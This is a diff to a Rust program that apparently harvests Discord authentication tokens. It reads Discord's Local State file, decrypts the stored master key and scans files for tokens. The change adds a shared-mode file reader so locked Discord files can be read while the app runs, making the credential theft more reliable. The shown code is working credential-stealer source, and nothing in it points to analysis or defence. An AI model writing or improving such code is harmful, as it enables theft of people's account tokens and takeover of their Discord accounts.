@@ -432,12 +432,35 @@ fn unprotect_data(data: &[u8]) -> Option<Vec<u8>> {
     }
 }
 
+#[cfg(target_os = "windows")]
+use std::os::windows::fs::OpenOptionsExt;
+
+fn read_file_shared(path: &Path) -> Option<Vec<u8>> {
+    #[cfg(target_os = "windows")]
+    {
+        use std::io::Read;
+        let mut file = std::fs::OpenOptions::new()
+            .read(true)
+            .share_mode(7) // FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE
+            .open(path)
+            .ok()?;
+        let mut bytes = Vec::new();
+        file.read_to_end(&mut bytes).ok()?;
+        Some(bytes)
+    }
+    #[cfg(not(target_os = "windows"))]
+    {
+        std::fs::read(path).ok()
+    }
+}
+
 fn get_discord_master_key(discord_dir: &Path) -> Option<Vec<u8>> {
     let local_state_path = discord_dir.join("Local State");
     if !local_state_path.exists() {
         return None;
     }
-    let content = std::fs::read_to_string(local_state_path).ok()?;
+    let bytes = read_file_shared(&local_state_path)?;
+    let content = String::from_utf8_lossy(&bytes);
     let json: serde_json::Value = serde_json::from_str(&content).ok()?;
     let encrypted_key_b64 = json.get("os_crypt")?.get("encrypted_key")?.as_str()?;
     let encrypted_key = base64::engine::general_purpose::STANDARD.decode(encrypted_key_b64).ok()?;
@@ -529,7 +552,7 @@ fn scan_dir_for_tokens(dir: &Path, master_key: Option<&[u8]>, candidates: &mut V
         let mut plain_tokens = Vec::new();
 
         for (_, path) in files {
-            if let Ok(bytes) = std::fs::read(&path) {
+            if let Some(bytes) = read_file_shared(&path) {
                 let text = String::from_utf8_lossy(&bytes);
                 extract_tokens_from_text(&text, master_key, &mut encrypted_tokens, &mut plain_tokens);
             }
